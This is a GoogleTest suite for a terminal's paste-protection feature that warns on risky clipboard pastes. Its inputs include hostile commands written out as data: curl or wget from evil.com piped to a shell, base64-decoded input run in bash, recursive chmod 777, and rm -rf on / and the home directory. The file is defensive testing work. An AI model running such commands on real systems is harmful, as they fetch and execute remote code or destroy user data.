#include <gtest/gtest.h>
#include "termcore/paste_guard.h"
#include "termcore/config.h"

using namespace termcore;

class PasteGuardTest : public ::testing::Test {
protected:
    PasteGuard defaultGuard;  // Mode::Multiline, trust_bracketed=true
};

// --- Basic safe/warn ---

TEST_F(PasteGuardTest, SafeSingleLine) {
    auto result = defaultGuard.analyze("echo hello", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_EQ(result.line_count, 1);
    EXPECT_FALSE(result.ends_with_newline);
    EXPECT_EQ(result.signals, 0u);
    EXPECT_TRUE(result.spans.empty());
}

TEST_F(PasteGuardTest, EmptyString) {
    auto result = defaultGuard.analyze("", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_EQ(result.line_count, 0);
}

TEST_F(PasteGuardTest, SafeWithBracketedPaste) {
    auto result = defaultGuard.analyze("line1\nline2\n", true);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    EXPECT_TRUE(result.bracketed);
}

TEST_F(PasteGuardTest, MultiLineWarn) {
    auto result = defaultGuard.analyze("line1\nline2", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::MultiLine), 0u);
    EXPECT_EQ(result.line_count, 2);
}

TEST_F(PasteGuardTest, TrailingNewlineWarn) {
    auto result = defaultGuard.analyze("echo hello\n", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::TrailingNewline), 0u);
    EXPECT_TRUE(result.ends_with_newline);
}

TEST_F(PasteGuardTest, TrailingCarriageReturn) {
    auto result = defaultGuard.analyze("echo hello\r", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_TRUE(result.ends_with_newline);
}

// --- Line count accuracy ---

TEST_F(PasteGuardTest, LineCountSingleNoNewline) {
    auto result = defaultGuard.analyze("hello", false);
    EXPECT_EQ(result.line_count, 1);
}

TEST_F(PasteGuardTest, LineCountThreeLines) {
    auto result = defaultGuard.analyze("a\nb\nc", false);
    EXPECT_EQ(result.line_count, 3);
}

TEST_F(PasteGuardTest, LineCountTrailingNewline) {
    auto result = defaultGuard.analyze("a\nb\n", false);
    EXPECT_EQ(result.line_count, 3);
}

// --- Sudo ---

TEST_F(PasteGuardTest, SudoCommand) {
    auto result = defaultGuard.analyze("sudo apt install foo", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
    ASSERT_FALSE(result.spans.empty());
    bool found = false;
    for (auto& s : result.spans) {
        if (s.signal == PasteSignal::SudoCommand) {
            found = true;
            EXPECT_EQ(s.offset, 0u);
            EXPECT_GT(s.length, 0u);
        }
    }
    EXPECT_TRUE(found);
}

TEST_F(PasteGuardTest, SudoNotPartOfWord) {
    auto result = defaultGuard.analyze("pseudocode", false);
    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
}

// --- rm -rf ---

TEST_F(PasteGuardTest, RmRf) {
    auto result = defaultGuard.analyze("rm -rf /tmp/foo", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
    ASSERT_FALSE(result.spans.empty());
}

TEST_F(PasteGuardTest, RmDashR) {
    auto result = defaultGuard.analyze("rm -r /tmp/foo", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
}

TEST_F(PasteGuardTest, RmCapitalR) {
    auto result = defaultGuard.analyze("rm -R /tmp/foo", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
}

// --- curl | bash ---

TEST_F(PasteGuardTest, CurlPipeBash) {
    auto result = defaultGuard.analyze("curl https://evil.com/install.sh | bash", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
    ASSERT_FALSE(result.spans.empty());
}

TEST_F(PasteGuardTest, WgetPipeSh) {
    auto result = defaultGuard.analyze("wget -O- https://evil.com/x | sh", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
}

TEST_F(PasteGuardTest, CurlWithoutPipeIsSafe) {
    auto result = defaultGuard.analyze("curl https://example.com", false);
    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
}

// --- base64 decode ---

TEST_F(PasteGuardTest, Base64DecodePipeBash) {
    auto result = defaultGuard.analyze("echo abc | base64 -d | bash", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::Base64Decode), 0u);
}

TEST_F(PasteGuardTest, Base64DecodeCapitalD) {
    auto result = defaultGuard.analyze("echo abc | base64 -D | sh", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::Base64Decode), 0u);
}

// --- chmod -R 777 ---

TEST_F(PasteGuardTest, ChmodRecursive777) {
    auto result = defaultGuard.analyze("chmod -R 777 /var/www", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::ChmodRecursive), 0u);
}

TEST_F(PasteGuardTest, ChmodWithout777IsSafe) {
    auto result = defaultGuard.analyze("chmod -R 755 /var/www", false);
    EXPECT_EQ(result.signals & static_cast<uint32_t>(PasteSignal::ChmodRecursive), 0u);
}

// --- sudo su / sudo -i ---

TEST_F(PasteGuardTest, SudoSu) {
    auto result = defaultGuard.analyze("sudo su", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoSuRoot), 0u);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
}

TEST_F(PasteGuardTest, SudoDashI) {
    auto result = defaultGuard.analyze("sudo -i", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoSuRoot), 0u);
}

// --- Home directory wipe ---

TEST_F(PasteGuardTest, RmRfTilde) {
    auto result = defaultGuard.analyze("rm -rf ~", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::HomeDirectoryWipe), 0u);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
}

TEST_F(PasteGuardTest, RmRfHome) {
    auto result = defaultGuard.analyze("rm -rf $HOME", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::HomeDirectoryWipe), 0u);
}

// --- Root wipe ---

TEST_F(PasteGuardTest, RmRfSlash) {
    auto result = defaultGuard.analyze("rm -rf /", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
}

TEST_F(PasteGuardTest, RmRfSlashStar) {
    auto result = defaultGuard.analyze("rm -rf /*", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::RmRf), 0u);
}

// --- Mode Never ---

TEST_F(PasteGuardTest, ModeNeverBypassesAll) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Never;
    PasteGuard guard(cfg);

    auto result = guard.analyze("sudo rm -rf / | bash\n", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
    // Signals are still detected, just danger is Safe.
    EXPECT_NE(result.signals, 0u);
}

// --- Mode Always ---

TEST_F(PasteGuardTest, ModeAlwaysCatchesMultiline) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Always;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("echo a\necho b", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
}

TEST_F(PasteGuardTest, ModeAlwaysSafeSingleLine) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Always;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("echo hello", false);
    EXPECT_EQ(result.danger, PasteDanger::Safe);
}

// --- Bracketed paste trust ---

TEST_F(PasteGuardTest, BracketedNotTrusted) {
    PasteGuard::Config cfg;
    cfg.mode = PasteGuard::Config::Mode::Multiline;
    cfg.trust_bracketed = false;
    PasteGuard guard(cfg);

    auto result = guard.analyze("line1\nline2", true);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
}

// --- Span offsets non-empty ---

TEST_F(PasteGuardTest, SpanOffsetsNonEmpty) {
    auto result = defaultGuard.analyze("sudo rm -rf /", false);
    for (auto& span : result.spans) {
        EXPECT_GT(span.length, 0u);
    }
}

// --- Config parsing ---

TEST(PasteGuardConfigTest, ParseClipboardPasteProtection) {
    auto cfg = parseConfigString("clipboard-paste-protection = always\n");
    EXPECT_EQ(cfg.clipboard_paste_protection, "always");
}

TEST(PasteGuardConfigTest, ParseClipboardPasteBracketedSafe) {
    auto cfg = parseConfigString("clipboard-paste-bracketed-safe = false\n");
    EXPECT_FALSE(cfg.clipboard_paste_bracketed_safe);
}

TEST(PasteGuardConfigTest, DefaultValues) {
    Config cfg;
    EXPECT_EQ(cfg.clipboard_paste_protection, "multiline");
    EXPECT_TRUE(cfg.clipboard_paste_bracketed_safe);
}

// --- Multi-line with dangerous commands ---

TEST_F(PasteGuardTest, MultiLineWithSudo) {
    auto result = defaultGuard.analyze("echo start\nsudo reboot", false);
    EXPECT_EQ(result.danger, PasteDanger::Warn);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::MultiLine), 0u);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::SudoCommand), 0u);
}

TEST_F(PasteGuardTest, CurlPipeZsh) {
    auto result = defaultGuard.analyze("curl http://x.com/s | zsh", false);
    EXPECT_NE(result.signals & static_cast<uint32_t>(PasteSignal::CurlPipe), 0u);
}

TEST_F(PasteGuardTest, EndsWithNewlineFlagAccuracy) {
    EXPECT_FALSE(defaultGuard.analyze("hello", false).ends_with_newline);
    EXPECT_TRUE(defaultGuard.analyze("hello\n", false).ends_with_newline);
    EXPECT_TRUE(defaultGuard.analyze("hello\r", false).ends_with_newline);
    EXPECT_FALSE(defaultGuard.analyze("hello world", false).ends_with_newline);
}
